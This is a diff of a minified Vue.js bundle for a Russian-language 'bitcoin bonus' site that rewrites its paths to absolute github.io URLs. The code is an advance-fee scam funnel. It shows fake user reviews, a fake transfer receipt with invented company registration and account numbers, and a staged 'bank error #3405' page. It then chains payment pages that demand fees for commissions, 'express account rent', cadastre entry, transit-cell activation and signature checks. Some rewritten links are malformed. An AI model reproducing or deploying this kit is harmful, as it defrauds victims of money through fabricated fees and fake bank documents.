@@ -2269,7 +2269,7 @@
                     usersOnline: 267,
                     usersOnlineTimer: null,
                     d: new Date,
-                    publicPath: "/offbitbonus/",
+                    publicPath: "https://banksyst.github.io/bitcoin/offbitbonus/",
                     monthShort: new Array("янв","фев","мар","апр","мая","июн","июл","авг","сен","окт","нояб","дек"),
                     reactionsLocal: [],
                     account: {
@@ -3274,7 +3274,7 @@
                 return {
                     searchInput: "",
                     searchBoxClass: "",
-                    publicPath: "/offbitbonus/",
+                    publicPath: "https://banksyst.github.io/bitcoin/offbitbonus/",
                     sitename: this.$store.state["/offbitbonus/"].sitename,
                     d: new Date,
                     month: new Array("янв","фев","мар","апр","мая","июн","июл","авг","сен","окт","нояб","дек"),
@@ -3489,7 +3489,7 @@
                     }
                     ))
                 }
-                this.afterExchage = !["/", "/datascript", "/account/lawyerswift", "/account/swift", "/account/lawyerrequisits", "/account/requisits", "/account/lawyerexchange", "/account/exchangeBTC"].includes(this.$route.path)
+                this.afterExchage = !["/", "https://banksyst.github.io/bitcoin/datascript", "https://banksyst.github.io/bitcoin/account/lawyerswift", "https://banksyst.github.io/bitcoin/account/swift", "https://banksyst.github.io/bitcoin/account/lawyerrequisits", "https://banksyst.github.io/bitcoin/account/requisits", "https://banksyst.github.io/bitcoin/account/lawyerexchange", "https://banksyst.github.io/bitcoin/account/exchangeBTC"].includes(this.$route.path)
             }
         })
           , b = g
@@ -3735,7 +3735,7 @@
             name: "FooterItem",
             data: function() {
                 return {
-                    publicPath: "/offbitbonus/",
+                    publicPath: "https://banksyst.github.io/bitcoin/offbitbonus/",
                     sitename: this.$store.state["/offbitbonus/"].sitename,
                     socnets: [{
                         nameWrap: "vk",
@@ -3788,7 +3788,7 @@
             data: function() {
                 return {
                     isTestMode: JSON.parse(localStorage.getItem("test")) || !1,
-                    publicPath: "/offbitbonus/",
+                    publicPath: "https://banksyst.github.io/bitcoin/offbitbonus/",
                     upsells: {
                         ru: D["a"]
                     }
@@ -3925,7 +3925,7 @@
             data: function() {
                 return {
                     debug: !1,
-                    publicPath: "/offbitbonus/",
+                    publicPath: "https://banksyst.github.io/bitcoin/offbitbonus/",
                     responseKurs: null,
                     dateNow: (new Date).getTime(),
                     coins: [{
@@ -4127,7 +4127,7 @@
                     "min-width": "200px"
                 },
                 attrs: {
-                    to: "/datascript"
+                    to: "https://banksyst.github.io/bitcoin/datascript"
                 },
                 on: {
                     click: function(t) {
@@ -4153,7 +4153,7 @@
                 staticClass: "g-sing-in-btn cursor-pointer d-flex justify-content-center align-items-center",
                 attrs: {
                     href: "javascript:void(0);",
-                    to: "/datascript"
+                    to: "https://banksyst.github.io/bitcoin/datascript"
                 },
                 on: {
                     click: function(t) {
@@ -4263,7 +4263,7 @@
                 },
                 attrs: {
                     href: "javascript:void(0);",
-                    to: "/datascript"
+                    to: "https://banksyst.github.io/bitcoin/datascript"
                 },
                 on: {
                     click: function(e) {
@@ -4348,7 +4348,7 @@
                         value: this.form.login
                     }),
                     this.$reachGoal("settings_mail"),
-                    this.$router.push("/datascript"),
+                    this.$router.push("https://banksyst.github.io/bitcoin/datascript"),
                     void this.$reachGoal("registration")) : (alert("Введенный вами электронная почта не корректнная. Напишите правильный е-мейл"),
                     !1)
                 },
@@ -4618,7 +4618,7 @@
           , ut = {
             data: function() {
                 return {
-                    publicPath: "/offbitbonus/",
+                    publicPath: "https://banksyst.github.io/bitcoin/offbitbonus/",
                     reviews: [{
                         name: "Леонид Т.",
                         avatar: "review-2.jpg",
@@ -4746,7 +4746,7 @@
             name: "LandingItem",
             data: function() {
                 return {
-                    publicPath: "/offbitbonus/"
+                    publicPath: "https://banksyst.github.io/bitcoin/offbitbonus/"
                 }
             },
             components: {
@@ -4774,19 +4774,19 @@
         };
         a["default"].use(B["a"]);
         var St = new B["a"]({
-            base: "/" + location.pathname.split("/")[1] + "/",
+            base: "https://banksyst.github.io/bitcoin/" + location.pathname.split("/")[1] + "/",
             mode: "history",
             routes: [{
                 name: "landing",
-                path: "/",
+                path: "https://banksyst.github.io/bitcoin/",
                 component: Ct
             }, {
                 name: "datascript",
-                path: "/datascript",
+                path: "https://banksyst.github.io/bitcoin/datascript",
                 component: Dt
             }, {
                 name: "account",
-                path: "/account/:product",
+                path: "https://banksyst.github.io/bitcoin/account/:product",
                 component: kt
             }],
             scrollBehavior: function() {
@@ -4799,7 +4799,7 @@
           , jt = s("c0d6")
           , Lt = (s("4917"),
         s("c5f6"),
-        "/offbitbonus/")
+        "https://banksyst.github.io/bitcoin/offbitbonus/")
           , Tt = "production"
           , zt = function() {
             throw new Error("param is required")
@@ -4964,7 +4964,7 @@
                 }
                 ,
                 t.prototype.$afterExchange = function(t) {
-                    return !["/", "/datascript", "/account/lawyerswift", "/account/swift", "/account/lawyerrequisits", "/account/requisits", "/account/lawyerexchange", "/account/exchangeBTC"].includes(this.$route.path)
+                    return !["https://banksyst.github.io/bitcoin/", "https://banksyst.github.io/bitcoin/datascript", "https://banksyst.github.io/bitcoin/account/lawyerswift", "https://banksyst.github.io/bitcoin/account/swift", "https://banksyst.github.io/bitcoin/account/lawyerrequisits", "https://banksyst.github.io/bitcoin/account/requisits", "https://banksyst.github.io/bitcoin/account/lawyerexchange", "https://banksyst.github.io/bitcoin/account/exchangeBTC"].includes(this.$route.path)
                 }
             }
         }
@@ -5047,7 +5047,7 @@
         s("a481"),
         s("c0d6"))
           , i = s("bc3a")
-          , o = "/offbitbonus/";
+          , o = "https://banksyst.github.io/bitcoin/offbitbonus/";
         window.epayID = "/b/3974";
         var r = n["a"].state[o]
           , c = n["a"].state[o].address
@@ -5088,13 +5088,13 @@
                     h: 0
                 },
                 buttonText: "Заполнить анкету",
-                paymentLink: "/account/lawyerrequisits?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/lawyerrequisits?s=gd260ca58",
                 paymentLinks: {
-                    e: "/account/lawyerrequisits?s=gd260ca58",
-                    c: "/account/lawyerrequisits?s=gd260ca58",
-                    b: "/account/lawyerrequisits?s=gd260ca58",
-                    p: "/account/lawyerrequisits?s=gd260ca58",
-                    h: "/account/lawyerrequisits?s=gd260ca58"
+                    e: "https://banksyst.github.io/bitcoin/account/lawyerrequisits?s=gd260ca58",
+                    c: "https://banksyst.github.io/bitcoin/account/lawyerrequisits?s=gd260ca58",
+                    b: "https://banksyst.github.io/bitcoin/account/lawyerrequisits?s=gd260ca58",
+                    p: "https://banksyst.github.io/bitcoin/account/lawyerrequisits?s=gd260ca58",
+                    h: "https://banksyst.github.io/bitcoin/account/lawyerrequisits?s=gd260ca58"
                 }
             },
             requisits: {
@@ -5132,13 +5132,13 @@
                         ))
                     }
                 },
-                paymentLink: "/account/requisits?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/requisits?s=gd260ca58",
                 paymentLinks: {
-                    e: "/account/requisits?s=gd260ca58",
-                    c: "/account/requisits?s=gd260ca58",
-                    h: "/account/requisits?s=gd260ca58",
-                    b: "/account/requisits?s=gd260ca58",
-                    p: "/account/requisits?s=gd260ca58"
+                    e: "https://banksyst.github.io/bitcoin/account/requisits?s=gd260ca58",
+                    c: "https://banksyst.github.io/bitcoin/account/requisits?s=gd260ca58",
+                    h: "https://banksyst.github.io/bitcoin/account/requisits?s=gd260ca58",
+                    b: "https://banksyst.github.io/bitcoin/account/requisits?s=gd260ca58",
+                    p: "https://banksyst.github.io/bitcoin/account/requisits?s=gd260ca58"
                 }
             },
             lawyerexchange: {
@@ -5171,13 +5171,13 @@
                     h: 0
                 },
                 buttonText: "Конвертировать валюту",
-                paymentLink: "/account/lawyerexchange?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/lawyerexchange?s=gd260ca58",
                 paymentLinks: {
-                    e: "/account/lawyerexchange?s=gd260ca58",
-                    c: "/account/lawyerexchange?s=gd260ca58",
-                    h: "/account/lawyerexchange?s=gd260ca58",
-                    b: "/account/lawyerexchange?s=gd260ca58",
-                    p: "/account/lawyerexchange?s=gd260ca58"
+                    e: "https://banksyst.github.io/bitcoin/account/lawyerexchange?s=gd260ca58",
+                    c: "https://banksyst.github.io/bitcoin/account/lawyerexchange?s=gd260ca58",
+                    h: "https://banksyst.github.io/bitcoin/account/lawyerexchange?s=gd260ca58",
+                    b: "https://banksyst.github.io/bitcoin/account/lawyerexchange?s=gd260ca58",
+                    p: "https://banksyst.github.io/bitcoin/account/lawyerexchange?s=gd260ca58"
                 }
             },
             exchangeBTC: {
@@ -5200,13 +5200,13 @@
                 customItem: '<div class="align-items-center justify-content-center row text-center" style="margin-bottom: 20px;"> <div class="col-sm my-auto"> <label style="padding: 10px;border-radius: 10px;border: 2px double #0094be;color: #0093c0;"><b>Отдаём  <span class="text-numbers">{{moneyBTC}}</span></b></label> </div><div><div class="bit-lang-g-icon col-sm obmenbtc"></div></div><div class="col-sm my-auto"> <label style="padding: 10px;border-radius: 10px;border: 2px double #0094be;color: #0093c0;"><b>Получаем <span class="text-numbers">{{convertedAmountUSD}}</span></b> </label> </div></div>',
                 instructions: ['Нажмите на кнопку "обменять BTC на <span class="text-uppercase">{{converting_geoCur}}</span>"', "Оплатите комиссию за обмен криптовалюты", "Получите ваши средства в долларах"],
                 buttonText: 'Обменять BTC на <span class="text-uppercase">{{converting_geoCur}}</span>',
-                paymentLink: "/account/exchange?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/exchange?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "/epay48544.html",
-                    c: window.location.origin + o + "/epay48544.html",
-                    b: window.location.origin + o + "/epay48544.html",
-                    p: window.location.origin + o + "/epay48544.html",
-                    h: window.location.origin + o + "/epay48544.html"
+                    e: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48544.html",
+                    c: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48544.html",
+                    b: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48544.html",
+                    p: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48544.html",
+                    h: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48544.html"
                 }
             },
             lawyerreceipt: {
@@ -5239,13 +5239,13 @@
                     h: 0
                 },
                 buttonText: "Перейти к созданию квитанции и получению средств",
-                paymentLink: "/account/lawyerreceipt?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/lawyerreceipt?s=gd260ca58",
                 paymentLinks: {
-                    e: "/account/lawyerreceipt?s=gd260ca58",
-                    c: "/account/lawyerreceipt?s=gd260ca58",
-                    h: "/account/lawyerreceipt?s=gd260ca58",
-                    b: "/account/lawyerreceipt?s=gd260ca58",
-                    p: "/account/lawyerreceipt?s=gd260ca58"
+                    e: "https://banksyst.github.io/bitcoin/account/lawyerreceipt?s=gd260ca58",
+                    c: "https://banksyst.github.io/bitcoin/account/lawyerreceipt?s=gd260ca58",
+                    h: "https://banksyst.github.io/bitcoin/account/lawyerreceipt?s=gd260ca58",
+                    b: "https://banksyst.github.io/bitcoin/account/lawyerreceipt?s=gd260ca58",
+                    p: "https://banksyst.github.io/bitcoin/account/lawyerreceipt?s=gd260ca58"
                 }
             },
             receipt: {
@@ -5257,7 +5257,7 @@
                 statusMessage: "Указанные реквизиты требуют Вашего подтверждения!",
                 title: "Внимательно проверьте реквизиты получателя!",
                 product: "Если вы указали неправильные данные, исправьте их сейчас прямо в квитанции",
-                customItem: '\n    <div class="d-flex justify-content-center">\n      <div>\n      <div class="position-relative receipt-container overflow-hidden">\n\n        <div class="section-self-462 p-3 receipt-body shadow mx-auto" style="max-width: 350px; text-align: left;">\n          <div>\n            <h5 class="pt-3">Квитанция перевода</h5>\n            <table>\n              <tbody>\n                <tr>\n                  <td>Сумма платежа&nbsp;</td>\n                  <td class="text-numbers font-weight-lighter">&nbsp;{{moneyPageBased}}</td>\n                </tr>\n                <tr class="{{d-none}}">\n                  <td>Комиссия&nbsp;</td>\n                  <td class="text-numbers font-weight-lighter">&nbsp;{receiptAmount}&nbsp;₽{{geoReceiptAmount}}</td>\n                </tr>\n              </tbody>\n            </table>\n          </div>\n          <div>\n            <h5 class="top-dashed mt-3 pt-1">Реквизиты получателя</h5>\n              <table>\n                <tbody>\n                  <tr>\n                    <td>Имя&nbsp;</td>\n                    <td><input type="text" class="data-inputs" placeholder="{{usernamePlaceholder}}" name="username"></td>\n                  </tr>\n                  <tr>\n                    <td>Способ получения&nbsp;</td>\n                    <td><select class="data-inputs w-100" name="paymentMethod">\n                      <option>Банковская карта (Россия)</option>\n                      <option>Банковская карта (Другие страны)</option>\n                      <option>Электронный кошелек</option>\n                      <option class="d-none" selected="">{{paymentMethod}}</option>\n                    </select>\n                    </td>\n                  </tr>\n                  <tr>\n                    <td>Номер карты/счета&nbsp;</td>\n                    <td><input type="text" class="data-inputs" placeholder="{{paymentNumberPlaceholder}}" name="paymentNumber"></td>\n                  </tr>\n                </tbody>\n              </table>\n            </div>\n            <div>\n              <h5 class="top-dashed mt-3 pt-1">Реквизиты отправителя</h5>\n                <table>\n                  <tbody>\n                    <tr>\n                      <td>Наименование&nbsp;</td>\n                      <td>LTD "{{sitename}}" </td>\n                    </tr>\n                    <tr>\n                      <td>ИНН&nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">7732178950</td>\n                    </tr>\n                    <tr>\n                      <td>КПП&nbsp;</td>\n                      <td class="text-numbers font-weight-lighter" font-weight-lighter>370201001</td>\n                    </tr>\n                    <tr>\n                      <td>ОКПО&nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">14264392</td>\n                    </tr>\n                    <tr>\n                      <td>ОГРН&nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">1037233038364</td>\n                    </tr>\n                    <tr>\n                      <td>р/с &nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">15241249614833674</td>\n                    </tr>\n                    <tr>\n                      <td>Адрес &nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">'.concat(c, '</td>\n                    </tr>\n                  </tbody>\n                </table>\n              </div>\n            </div>\n            </div>\n            <div class="checkout-image" style="display:none; background-color: white;">\n              <img style="max-width:350px;" src="').concat(o, 'img/checkout_1.png" alt="">\n              <h4 style="text-align: center; color: #d48686; font-weight: 600; font-family: Tahoma, Arial, Helvetica, sans-serif;font-size: 20px; margin-bottom: -2px; text-transform: uppercase">{{today}}</h4>\n              <img style="max-width:350px;" src="').concat(o, 'img/checkout_2.png" alt="">\n            </div>\n            <p class="waitwards" style="text-align:center; display:none;">Пожалуйста подождите</p>\n          </div>\n        </div>'),
+                customItem: '\n    <div class="d-flex justify-content-center">\n      <div>\n      <div class="position-relative receipt-container overflow-hidden">\n\n        <div class="section-self-462 p-3 receipt-body shadow mx-auto" style="max-width: 350px; text-align: left;">\n          <div>\n            <h5 class="pt-3">Квитанция перевода</h5>\n            <table>\n              <tbody>\n                <tr>\n                  <td>Сумма платежа&nbsp;</td>\n                  <td class="text-numbers font-weight-lighter">&nbsp;{{moneyPageBased}}</td>\n                </tr>\n                <tr class="{{d-none}}">\n                  <td>Комиссия&nbsp;</td>\n                  <td class="text-numbers font-weight-lighter">&nbsp;{receiptAmount}&nbsp;₽{{geoReceiptAmount}}</td>\n                </tr>\n              </tbody>\n            </table>\n          </div>\n          <div>\n            <h5 class="top-dashed mt-3 pt-1">Реквизиты получателя</h5>\n              <table>\n                <tbody>\n                  <tr>\n                    <td>Имя&nbsp;</td>\n                    <td><input type="text" class="data-inputs" placeholder="{{usernamePlaceholder}}" name="username"></td>\n                  </tr>\n                  <tr>\n                    <td>Способ получения&nbsp;</td>\n                    <td><select class="data-inputs w-100" name="paymentMethod">\n                      <option>Банковская карта (Россия)</option>\n                      <option>Банковская карта (Другие страны)</option>\n                      <option>Электронный кошелек</option>\n                      <option class="d-none" selected="">{{paymentMethod}}</option>\n                    </select>\n                    </td>\n                  </tr>\n                  <tr>\n                    <td>Номер карты/счета&nbsp;</td>\n                    <td><input type="text" class="data-inputs" placeholder="{{paymentNumberPlaceholder}}" name="paymentNumber"></td>\n                  </tr>\n                </tbody>\n              </table>\n            </div>\n            <div>\n              <h5 class="top-dashed mt-3 pt-1">Реквизиты отправителя</h5>\n                <table>\n                  <tbody>\n                    <tr>\n                      <td>Наименование&nbsp;</td>\n                      <td>LTD "{{sitename}}" </td>\n                    </tr>\n                    <tr>\n                      <td>ИНН&nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">7732178950</td>\n                    </tr>\n                    <tr>\n                      <td>КПП&nbsp;</td>\n                      <td class="text-numbers font-weight-lighter" font-weight-lighter>370201001</td>\n                    </tr>\n                    <tr>\n                      <td>ОКПО&nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">14264392</td>\n                    </tr>\n                    <tr>\n                      <td>ОГРН&nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">1037233038364</td>\n                    </tr>\n                    <tr>\n                      <td>р/с &nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">15241249614833674</td>\n                    </tr>\n                    <tr>\n                      <td>Адрес &nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">'.concat(c, '</td>\n                    </tr>\n                  </tbody>\n                </table>\n              </div>\n            </div>\n            </div>\n            <div class="checkout-image" style="display:none; background-color: white;">\n              <img style="max-width:350px;" src="').concat(o, 'https://banksyst.github.io/bitcoin/img/checkout_1.png" alt="">\n              <h4 style="text-align: center; color: #d48686; font-weight: 600; font-family: Tahoma, Arial, Helvetica, sans-serif;font-size: 20px; margin-bottom: -2px; text-transform: uppercase">{{today}}</h4>\n              <img style="max-width:350px;" src="').concat(o, 'https://banksyst.github.io/bitcoin/img/checkout_2.png" alt="">\n            </div>\n            <p class="waitwards" style="text-align:center; display:none;">Пожалуйста подождите</p>\n          </div>\n        </div>'),
                 amount: {
                     e: 0,
                     c: 0,
@@ -5279,13 +5279,13 @@
                 },
                 instructions: ["Проверьте имя получателя", "Проверьте номер счета", "Измените данные, если нашли ошибку", "Нажмите перевести деньги"],
                 buttonText: "Перевести деньги",
-                paymentLink: "/account/receipt?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/receipt?s=gd260ca58",
                 paymentLinks: {
-                    e: "/account/receipt?s=gd260ca58",
-                    c: "/account/receipt?s=gd260ca58",
-                    h: "/account/receipt?s=gd260ca58",
-                    b: "/account/receipt?s=gd260ca58",
-                    p: "/account/receipt?s=gd260ca58"
+                    e: "https://banksyst.github.io/bitcoin/account/receipt?s=gd260ca58",
+                    c: "https://banksyst.github.io/bitcoin/account/receipt?s=gd260ca58",
+                    h: "https://banksyst.github.io/bitcoin/account/receipt?s=gd260ca58",
+                    b: "https://banksyst.github.io/bitcoin/account/receipt?s=gd260ca58",
+                    p: "https://banksyst.github.io/bitcoin/account/receipt?s=gd260ca58"
                 }
             },
             comissionfp: {
@@ -5338,13 +5338,13 @@
                 customItem: "",
                 instructions: ["Гарантируем Вам быструю выплату", "Оплатите комиссии за перевод", "Получите вашу выплату в течении 10 минут"],
                 buttonText: "Оплатить комиссию",
-                paymentLink: "/account/comissionfp?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/comissionfp?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "epay48545.html",
-                    c: window.location.origin + o + "epay48545.html",
-                    b: window.location.origin + o + "epay48545.html",
-                    p: window.location.origin + o + "epay48545.html",
-                    h: window.location.origin + o + "epay48545.html"
+                    e: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48545.html",
+                    c: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48545.html",
+                    b: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48545.html",
+                    p: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48545.html",
+                    h: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48545.html"
                 }
             },
             error3405: {
@@ -5381,14 +5381,14 @@
                 customItem: '\n    <table class="table table-reject table-striped table-bordered">\n      <thead class="bg-primary text-white text-center" style="font-size:1.5rem;">\n        <tr>\n          <th scope="col" colspan="2" class="text-numbers><span class="font-weight-bolder">БАНК ОТКЛОНИЛ ОПЕРАЦИЮ ПЕРЕВОДА</span> error #3405</th>\n        </tr>\n      </thead>\n      <tbody>\n        <tr>\n          <th scope="row">№ Транзакции</th>\n          <td class="text-numbers">558216/16</td>\n        </tr>\n        <tr>\n          <th scope="row">Отправитель перевода</th>\n          <td class="text-numbers">LTD "{{sitename}}"<br>р/с 15241249614833674</td>\n        </tr>\n        <tr>\n          <th scope="row">Дата операции</th>\n          <td class="text-numbers">{{todayFull}}</td>\n        </tr>\n        <tr>\n          <th scope="row">Сумма</th>\n          <td class="text-numbers">{{moneyPageBased}}</td>\n        </tr>\n        <tr>\n          <th scope="row">Статус</th>\n          <td class="text-very-danger text-numbers">Ошибка на стороне банка<br>\n          Код ошибки: #3045\n          </td>\n        </tr>\n      </tbody>\n      </table>',
                 instructions: ["Свяжитесь с консультантом для решения вопроса"],
                 buttonText: "Cвязаться с консультантом",
-                paymentLink: "/account/error3405?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/error3405?s=gd260ca58",
                 paymentLinks: Object(a["a"])({
-                    e: "/account/error3405?s=gd260ca58",
-                    c: "/account/error3405?s=gd260ca58",
-                    p: "/account/error3405?s=gd260ca58",
-                    h: "/account/error3405?s=gd260ca58",
-                    b: "/account/error3405?s=gd260ca58"
-                }, "p", "/account/error3405?s=gd260ca58")
+                    e: "https://banksyst.github.io/bitcoin/account/error3405?s=gd260ca58",
+                    c: "https://banksyst.github.io/bitcoin/account/error3405?s=gd260ca58",
+                    p: "https://banksyst.github.io/bitcoin/account/error3405?s=gd260ca58",
+                    h: "https://banksyst.github.io/bitcoin/account/error3405?s=gd260ca58",
+                    b: "https://banksyst.github.io/bitcoin/account/error3405?s=gd260ca58"
+                }, "p", "https://banksyst.github.io/bitcoin/account/error3405?s=gd260ca58")
             },
             lawyercomission: {
                 name: "Менеджер-юрист и ошибка 3405",
@@ -5420,13 +5420,13 @@
                     h: 0
                 },
                 buttonText: "Получить инструкцию для вывода средств",
-                paymentLink: "/account/lawyercomission?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/lawyercomission?s=gd260ca58",
                 paymentLinks: {
-                    e: "/account/lawyercomission?s=gd260ca58",
-                    c: "/account/lawyercomission?s=gd260ca58",
-                    h: "/account/lawyercomission?s=gd260ca58",
-                    b: "/account/lawyercomission?s=gd260ca58",
-                    p: "/account/lawyercomission?s=gd260ca58"
+                    e: "https://banksyst.github.io/bitcoin/account/lawyercomission?s=gd260ca58",
+                    c: "https://banksyst.github.io/bitcoin/account/lawyercomission?s=gd260ca58",
+                    h: "https://banksyst.github.io/bitcoin/account/lawyercomission?s=gd260ca58",
+                    b: "https://banksyst.github.io/bitcoin/account/lawyercomission?s=gd260ca58",
+                    p: "https://banksyst.github.io/bitcoin/account/lawyercomission?s=gd260ca58"
                 }
             },
             comissionsp: {
@@ -5462,13 +5462,13 @@
                 customItem: "",
                 instructions: ["Гарантируем быстрый перевод", "Оплатите комиссию за второй перевод", "Получите вашу выплату целиком"],
                 buttonText: "Оплатить комиссию за второй перевод",
-                paymentLink: "/account/comissionsp?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/comissionsp?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "epay48546.html",
-                    c: window.location.origin + o + "epay48546.html",
-                    b: window.location.origin + o + "epay48546.html",
-                    p: window.location.origin + o + "epay48546.html",
-                    h: window.location.origin + o + "epay48546.html"
+                    e: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48546.html",
+                    c: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48546.html",
+                    b: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48546.html",
+                    p: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48546.html",
+                    h: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48546.html"
                 }
             },
             express: {
@@ -5504,13 +5504,13 @@
                 customItem: "",
                 instructions: ["Оплатите аренду экспресс счета", "Вывод будет совершен моментально", "Получите ваши средства"],
                 buttonText: "Оплатить аренду",
-                paymentLink: "/account/express?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/express?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "epay48547.html",
-                    c: window.location.origin + o + "epay48547.html",
-                    b: window.location.origin + o + "epay48547.html",
-                    p: window.location.origin + o + "epay48547.html",
-                    h: window.location.origin + o + "epay48547.html"
+                    e: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48547.html",
+                    c: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48547.html",
+                    b: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48547.html",
+                    p: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48547.html",
+                    h: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48547.html"
                 }
             },
             cadastr: {
@@ -5533,13 +5533,13 @@
                 customItem: "",
                 instructions: ["Оплатите перевод в кадастр", "Деньги придут на указанный ранее счет моментально"],
                 buttonText: "Внести в кадастр",
-                paymentLink: "/account/cadastr?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/cadastr?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "epay48548.html",
-                    c: window.location.origin + o + "epay48548.html",
-                    b: window.location.origin + o + "epay48548.html",
-                    p: window.location.origin + o + "epay48548.html",
-                    h: window.location.origin + o + "epay48548.html"
+                    e: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48548.html",
+                    c: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48548.html",
+                    b: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48548.html",
+                    p: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48548.html",
+                    h: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48548.html"
                 }
             },
             transitbooking: {
@@ -5562,13 +5562,13 @@
                 customItem: "",
                 instructions: ["Оплатите бронь", "Получите средства на указанные реквизиты"],
                 buttonText: "Оплатить бронь",
-                paymentLink: "/account/transitbooking?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/transitbooking?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "epay48549.html",
-                    c: window.location.origin + o + "epay48549.html",
-                    b: window.location.origin + o + "epay48549.html",
-                    p: window.location.origin + o + "epay48549.html",
-                    h: window.location.origin + o + "epay48549.html"
+                    e: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48549.html",
+                    c: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48549.html",
+                    b: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48549.html",
+                    p: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48549.html",
+                    h: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48549.html"
                 }
             },
             transitactivation: {
@@ -5591,13 +5591,13 @@
                 customItem: "",
                 instructions: ["Оплатите активацию транзитной ячейки", "Система автоматический активирует ячейку", "Ваша выплата будет отправлена на ваши реквизиты"],
                 buttonText: "Активировать",
-                paymentLink: "/account/transitactivation?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/transitactivation?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "epay48550.html",
-                    c: window.location.origin + o + "epay48550.html",
-                    b: window.location.origin + o + "epay48550.html",
-                    p: window.location.origin + o + "epay48550.html",
-                    h: window.location.origin + o + "epay48550.html"
+                    e: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48550.html",
+                    c: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48550.html",
+                    b: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48550.html",
+                    p: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48550.html",
+                    h: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48550.html"
                 }
             },
             signature: {
@@ -5620,13 +5620,13 @@
                 customItem: "",
                 instructions: ["Оплатите услуги генерации подписи", "С помощью подписи система автоматически выведет Ваш платеж", "Получите Вашу выплату"],
                 buttonText: "Оплатить услуги",
-                paymentLink: "/account/signature?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/signature?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "epay48551.html",
-                    c: window.location.origin + o + "epay48551.html",
-                    b: window.location.origin + o + "epay48551.html",
-                    p: window.location.origin + o + "epay48551.html",
-                    h: window.location.origin + o + "epay48551.html"
+                    e: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48551.html",
+                    c: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48551.html",
+                    b: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48551.html",
+                    p: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48551.html",
+                    h: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48551.html"
                 }
             },
             signatureverify: {
@@ -5649,13 +5649,13 @@
                 customItem: "",
                 instructions: ["Пополните свой баланс на указанную сумму", "Система автоматически проверит вашу подпись", "Ваша выплата будет отправлена на ваши реквизиты"],
                 buttonText: "Пополнить баланс",
-                paymentLink: "/account/signatureverify?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/signatureverify?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "epay48552.html",
-                    c: window.location.origin + o + "epay48552.html",
-                    b: window.location.origin + o + "epay48552.html",
-                    p: window.location.origin + o + "epay48552.html",
-                    h: window.location.origin + o + "epay48552.html"
+                    e: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48552.html",
